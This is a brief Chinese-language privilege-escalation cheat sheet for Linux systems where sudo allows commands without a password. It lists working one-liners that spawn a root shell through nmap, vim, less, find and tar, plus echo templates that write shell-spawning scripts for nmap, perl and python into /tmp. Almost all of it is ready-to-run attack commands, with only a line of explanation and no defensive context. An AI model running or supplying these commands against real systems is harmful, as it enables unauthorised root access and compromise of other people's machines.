看到 `(root) NOPASSWD: /usr/bin/xxx`

| 命令        | 提权方法                                                     |
| ----------- | ------------------------------------------------------------ |
| `nmap`      | `sudo nmap --interactive` → 输入 `!sh`                       |
| `vim`       | `sudo vim` → 输入 `:!/bin/bash`                              |
| `less/more` | `sudo less /etc/passwd` → 输入 `!bash`                       |
| `find`      | `sudo find / -name test -exec /bin/bash \;`                  |
| `tar`       | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash` |

\# 只要是能执行脚本的命令，都可以用这个模板 

echo 'os.execute("/bin/bash")' > /tmp/exp.nse  # nmap

 用 echo 'exec "/bin/bash";' > /tmp/exp.pl         # perl 用 

echo 'system("/bin/bash");' > /tmp/exp.py       # python 用


用程序固有的功能实现权限提升 

如：管理员工具 ，内置脚本，授权调试接口
比如有sudo的vim可以打开一个新的root级别的shell